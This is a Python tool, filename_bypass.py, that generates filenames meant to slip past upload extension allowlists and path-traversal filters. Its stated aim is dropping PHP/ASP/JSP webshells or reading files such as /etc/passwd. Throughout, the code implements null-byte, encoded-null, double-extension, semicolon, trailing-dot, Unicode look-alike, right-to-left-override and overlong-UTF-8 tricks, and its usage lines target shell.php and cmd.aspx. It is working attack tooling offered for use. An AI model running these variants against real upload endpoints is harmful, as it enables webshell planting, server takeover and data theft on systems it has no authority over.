"""
filename_bypass — generate upload-allowlist bypass filename variants.

Stdlib only. Aimed at:
    - File upload filters that allowlist extensions (.png, .pdf, .docx, ...)
    - Path traversal validators that look for literal '..' / '/'
    - Webshell drop scenarios in PHP/ASP/JSP where the server runtime picks
      the FIRST recognised extension (Apache) or the LAST (most others)

Given a target name (the bytes you want the server to actually execute or
store as), the tool produces candidate filenames that should pass naive
allowlist checks while still being interpreted as the original by the
underlying runtime.

Strategies:
    null            <target>\\x00.<allow>       -- truncation in C-backed APIs
    null-url        <target>%00.<allow>         -- URL-decoded null
    null-url2       <target>%2500.<allow>       -- double-encoded null
    multi-ext       <target>.<noise>.<allow>    -- Apache mod_mime picks .target
    semicolon       <target>;.<allow>           -- old IIS quirk
    case            <target_with_random_case>   -- case-insensitive bypass
    trailing-dot    <target>.<allow>.           -- Windows strips trailing dot
    trailing-space  <target>.<allow> + space    -- Windows strips trailing space
    unicode-dot     <target>\\u2024<allow>      -- ONE DOT LEADER, looks like '.'
    bidi-hidden     <target><RLO><allow-rev>    -- visual rendering lies
    overlong-dot    <target>%C0%AE<allow>       -- overlong UTF-8 '.'

Usage:
    python tools/filename_bypass.py shell.php --allow png,jpg,pdf
    python tools/filename_bypass.py cmd.aspx  --allow png --only null,bidi-hidden
    python tools/filename_bypass.py ../../etc/passwd --allow txt --only null,overlong-dot
"""

from __future__ import annotations

import argparse
import sys
import urllib.parse


def reverse_with_bidi(s: str) -> str:
    RLO = "‮"
    PDI = "⁩"
    return f"{RLO}{s}{PDI}"


def gen_null(target: str, allow: str) -> list[str]:
    return [f"{target}\x00.{allow}"]


def gen_null_url(target: str, allow: str) -> list[str]:
    return [f"{urllib.parse.quote(target)}%00.{allow}"]


def gen_null_url2(target: str, allow: str) -> list[str]:
    return [f"{urllib.parse.quote(target)}%2500.{allow}"]


def gen_multi_ext(target: str, allow: str) -> list[str]:
    # Apache mod_mime: file.php.png is handled by PHP (first known type)
    # Nginx ; trick: file.php;.png — old config
    # Add a "noise" extension between for layered uploads
    return [
        f"{target}.{allow}",
        f"{target}.junk.{allow}",
    ]


def gen_semicolon(target: str, allow: str) -> list[str]:
    return [f"{target};.{allow}", f"{target}.{allow};.{allow}"]


def gen_case(target: str, allow: str) -> list[str]:
    base = f"{target}.{allow}"
    return [base.upper(), base.swapcase(),
            "".join(c.upper() if i % 2 else c for i, c in enumerate(base))]


def gen_trailing_dot(target: str, allow: str) -> list[str]:
    # On Windows the trailing dot is stripped by the filesystem layer
    return [f"{target}.{allow}.", f"{target}.{allow}..."]


def gen_trailing_space(target: str, allow: str) -> list[str]:
    return [f"{target}.{allow} ", f"{target}.{allow}%20"]


def gen_unicode_dot(target: str, allow: str) -> list[str]:
    # U+2024 ONE DOT LEADER renders identically to '.' in most fonts;
    # U+FF0E FULLWIDTH FULL STOP another visual twin.
    return [
        f"{target}․{allow}",
        f"{target}．{allow}",
    ]


def gen_bidi_hidden(target: str, allow: str) -> list[str]:
    # Render: <target>.<allow> reads forward but the RLO segment is the real ext
    return [
        f"{target}.{reverse_with_bidi(allow[::-1])}",
        f"{reverse_with_bidi(target[::-1])}.{allow}",
    ]


def gen_overlong_dot(target: str, allow: str) -> list[str]:
    # Overlong UTF-8 encoding of '.' (0x2E) — accepted by some legacy
    # decoders, missed by byte-level filters
    return [
        f"{urllib.parse.quote(target)}%C0%AE{allow}",
        f"{urllib.parse.quote(target)}%E0%80%AE{allow}",
    ]


STRATEGIES = {
    "null":           gen_null,
    "null-url":       gen_null_url,
    "null-url2":      gen_null_url2,
    "multi-ext":      gen_multi_ext,
    "semicolon":      gen_semicolon,
    "case":           gen_case,
    "trailing-dot":   gen_trailing_dot,
    "trailing-space": gen_trailing_space,
    "unicode-dot":    gen_unicode_dot,
    "bidi-hidden":    gen_bidi_hidden,
    "overlong-dot":   gen_overlong_dot,
}


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        description="Generate upload-allowlist filename bypass variants.",
    )
    p.add_argument("target", help="filename whose contents you want stored as-is (e.g. shell.php)")
    p.add_argument(
        "--allow",
        default="png,jpg,pdf",
        help="comma list of allowlist extensions (default: png,jpg,pdf)",
    )
    p.add_argument("-o", "--only", help="comma-separated strategies to include")
    p.add_argument("--list-strategies", action="store_true")
    args = p.parse_args(argv)

    if args.list_strategies:
        for s in STRATEGIES:
            print(s)
        return 0

    allows = [a.strip() for a in args.allow.split(",") if a.strip()]
    only = [s.strip() for s in args.only.split(",")] if args.only else list(STRATEGIES)

    seen: set[str] = set()
    for strat in only:
        if strat not in STRATEGIES:
            print(f"[!] unknown strategy: {strat}", file=sys.stderr)
            continue
        for allow in allows:
            for candidate in STRATEGIES[strat](args.target, allow):
                if candidate in seen:
                    continue
                seen.add(candidate)
                print(candidate)
    return 0


if __name__ == "__main__":
    sys.exit(main())
